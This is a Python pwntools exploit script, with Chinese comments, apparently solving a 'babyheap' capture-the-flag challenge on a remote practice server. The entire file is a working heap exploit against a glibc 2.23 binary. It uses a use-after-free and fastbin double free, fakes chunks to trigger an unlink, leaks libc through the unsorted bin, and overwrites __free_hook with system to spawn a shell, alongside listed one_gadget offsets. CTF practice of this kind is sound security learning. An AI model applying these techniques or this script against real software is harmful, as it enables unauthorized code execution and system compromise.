#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27451
elfpath = 'babyheap_patched'
ldpath = 'ld-2.23.so'
libcpath = 'libc.so.6'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def rn(n): return p.recvn(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(keepends=True): return p.recvline(keepends=keepends)
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(element, address): return p.success("{} ==> {}".format(element, hex(address)))


def command(c):
    p.recvuntil(b'Choice:')
    sl(str(c).encode())


def add(index, content=(p64(0) + p64(0x31))*2):
    command(1)
    ru(b'Index:')
    sl(str(index).encode())
    ru(b'Content:')
    # 不满32长度，自动加上\n
    if len(content) < 32:
        sl(content)
    else:
        s(content[:32])

def edit(index, content):
    command(2)
    ru(b'Index:')
    sl(str(index).encode())
    ru(b'Content:')
    if len(content) < 32:
        sl(content)
    else:
        s(content[:32])


def free(index):
    command(4)
    ru(b'Index:')
    sl(str(index).encode())
    

def show(index):
    command(3)
    ru(b'Index:')
    sl(str(index).encode())


# start pwning

'''
uaf
edit次数不能超过3次
unlink解除写次数限制
fastbin attach打malloc_hook
onegadget getshell

❯ one_gadget ./libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
chunklist = 0x602060
counter_addr = 0x6020b0
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

add(0)
add(1)
add(2)
add(3)
add(4, b'/bin/sh')
free(1)
free(0)

# leak heap address
show(0)
chunk1_addr = u64(rl(keepends=False).ljust(8, b'\x00'))
# print(hex(u64(chunk1_addr.ljust(8, b'\x00'))))
leak('chunk: ', chunk1_addr)


# fastbin attack: fastbin double free to make two pointers pointed at the same chunk (glibc2.23)
free(1)
add(5, p64(chunk1_addr - 0x20)) # same as 1
add(6, b'a')                    # same as 0
add(7, b'a')                    # same as 1
 
target_addr = chunklist + 0x30
add(8, flat(target_addr - 0x18, target_addr - 0x10, 0x20, 0x90)) # 伪造fd和bk，绕过unlink的判断

edit(0, flat(0, 0x21)[:-1]) # create fake chunk，减去1个字节，不然会把之前伪造的fd指针的最后一字节给覆盖成 \x00

# trigger unlink，因为chunk 1此时被视作0x90大小，且size = 0x90，prev_inuse = 0，导致前面的0x20大小的fake chunk被unlink
# 从而导致chunk list被修改
free(1)
# gdb.attach(p)

# use unsorted bin attach to leak libc address
show(8) # 打印 unsorted bin
leaked_unsorted_bin_addr = u64(rl(keepends=False).ljust(8, b'\x00'))
libc_base = leaked_unsorted_bin_addr - (0x7f5280decb78 - 0x7f5280a28000) # 调试可知
libc.address = libc_base

# 修改free_hook
edit(6, p64(libc.sym['__free_hook'])[:-1]) # 将chunklist[3]的值改为libc.sym['__free_hook']
edit(3, p64(libc.sym['system']))

# trigger system('/bin/sh')
free(4)

shell()
